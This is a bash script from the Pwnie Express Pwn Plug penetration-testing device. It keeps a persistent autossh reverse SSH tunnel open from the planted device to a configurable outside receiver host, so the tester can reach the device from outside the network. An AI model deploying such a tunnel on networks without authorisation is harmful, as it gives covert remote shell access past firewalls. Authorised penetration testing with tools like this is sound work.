#!/bin/bash
# Copyright 2010-2015 Rapid Focus Security, LLC
# pwnieexpress.com
#
# This script contains proprietary software distributed under the terms of the Rapid Focus Security, LLC End User License Agreement (EULA).
#
# Use of this software signifies your agreement to the Rapid Focus Security, LLC End User License Agreement (EULA).
#
# Rapid Focus Security, LLC EULA: http://pwnieexpress.com/pdfs/RFSEULA.pdf
#
# Revision: 4.26.2012

# Get user variables from script_configs
# SSH_receiver=
# SSH_receiver_port=
. /var/pwnplug/script_configs/reverse_ssh_config.sh

# Set SSH variables
SSH_listener_port=3333
SSH_user=pwnplug
SSH_key="/root/.ssh/id_rsa"
Tunnel_status=`ps -C ssh -o pid,args |grep -o "${SSH_listener_port}:localhost:22"`
AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${SSH_listener_port}" |awk '{print$1}'`
SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${SSH_listener_port}:localhost:22" |awk '{print$1}'`

# Set standard autossh variables
export AUTOSSH_FIRST_POLL=60
export AUTOSSH_POLL=60
export AUTOSSH_GATETIME=30
export AUTOSSH_LOGFILE=/var/log/autossh.log
export AUTOSSH_DEBUG=no
export AUTOSSH_PATH=/usr/bin/ssh

# Set tunnel-specific autossh variables
export AUTOSSH_PORT=22082
export AUTOSSH_PIDFILE=/var/run/STD_autossh.pid

# If tunnel already established, do nothing. If not, attempt connect.
if [ "${Tunnel_status}" == "${SSH_listener_port}:localhost:22" ] ; then echo connected ; \
else \
kill ${AUTOSSH_PID}; \
kill ${SSH_ChildProcess_PID}; \
sleep 1
autossh -2NR ${SSH_listener_port}:localhost:22 -i "${SSH_key}" "${SSH_user}"@"${SSH_receiver}" -p "${SSH_receiver_port}"; \
fi
